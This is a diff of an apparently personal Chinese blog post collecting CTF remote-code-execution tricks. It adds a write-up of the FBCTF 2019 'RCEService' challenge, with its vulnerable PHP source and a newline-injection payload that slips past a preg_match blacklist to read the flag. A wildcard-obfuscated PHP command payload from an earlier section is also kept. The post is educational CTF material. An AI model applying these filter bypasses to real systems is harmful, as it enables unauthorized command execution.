@@ -93,7 +93,7 @@
 <meta property="og:site_name" content="sketch_pl4ne">
 <meta property="og:description" content="前言这里用来记录一下自己做题过程中遇到有趣的RCE～ 5个字符getshell题目：BabyFirst Revenge HITCON CTF 2017的题目，之前已经了解过思路，还是挺有意思的。 源码： 1234567891011121314&lt;?php   echo $_SERVER[&#39;REMOTE_ADDR&#39;].&quot;\n&quot;;   $sandbox &#x3D; &#39;.&#x2F;sanbox&#39;;   mkdir(">
 <meta property="article:published_time" content="2020-04-07T13:40:18.000Z">
-<meta property="article:modified_time" content="2020-04-07T16:06:19.941Z">
+<meta property="article:modified_time" content="2020-04-08T01:09:02.113Z">
 <meta property="article:author" content="sketch_pl4ne">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -305,7 +305,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.1k
+                  1.3k
                 </span>
               
 
@@ -321,7 +321,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  5
+                  6
                 </span>
               
             </div>
@@ -402,6 +402,16 @@
 <h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>如果php版本不是7.0的话，那么可以考虑使用通配符读取文件。</p>
 <h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h3><p>这里通配符匹配有点玄学，我复现没有成功，贴一个payload吧。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=`/???/??? ????.???`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过preg-replace"><a href="#绕过preg-replace" class="headerlink" title="绕过preg_replace()"></a>绕过preg_replace()</h2><p>题目：<strong>[FBCTF2019]RCEService</strong></p>
+<p>考察点：<code>preg_replace()</code>只对第一行进行匹配，当我们在输入点两端输入回车符<code>%0a</code>时，可以绕过过滤。</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%<span class="number">0</span>a<span class="string">"cmd"</span>:<span class="string">"/bin/cat /home/rceservice/flag"</span>%<span class="number">0</span>a&#125;</span><br></pre></td></tr></table></figure>
+
+
 
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>慢慢走出来了，毕竟世界上还有那么多美好的东西。</p>
 <p>和你。</p>
@@ -596,7 +606,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5个字符getshell"><span class="nav-number">2.</span> <span class="nav-text">5个字符getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前置知识"><span class="nav-number">2.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路"><span class="nav-number">2.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本"><span class="nav-number">2.3.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#取反getshell"><span class="nav-number">3.</span> <span class="nav-text">取反getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前置知识-1"><span class="nav-number">3.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路1"><span class="nav-number">3.2.</span> <span class="nav-text">思路1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本-1"><span class="nav-number">3.3.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路2"><span class="nav-number">3.4.</span> <span class="nav-text">思路2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本-2"><span class="nav-number">3.5.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">4.</span> <span class="nav-text">小结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5个字符getshell"><span class="nav-number">2.</span> <span class="nav-text">5个字符getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前置知识"><span class="nav-number">2.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路"><span class="nav-number">2.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本"><span class="nav-number">2.3.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#取反getshell"><span class="nav-number">3.</span> <span class="nav-text">取反getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前置知识-1"><span class="nav-number">3.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路1"><span class="nav-number">3.2.</span> <span class="nav-text">思路1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本-1"><span class="nav-number">3.3.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路2"><span class="nav-number">3.4.</span> <span class="nav-text">思路2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本-2"><span class="nav-number">3.5.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过preg-replace"><span class="nav-number">4.</span> <span class="nav-text">绕过preg_replace()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">5.</span> <span class="nav-text">小结</span></a></li></ol></div>
             
 
           </div>
@@ -634,7 +644,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">37.9k</span>
+    <span title="Site words total count">38.1k</span>
   
 </div>
 
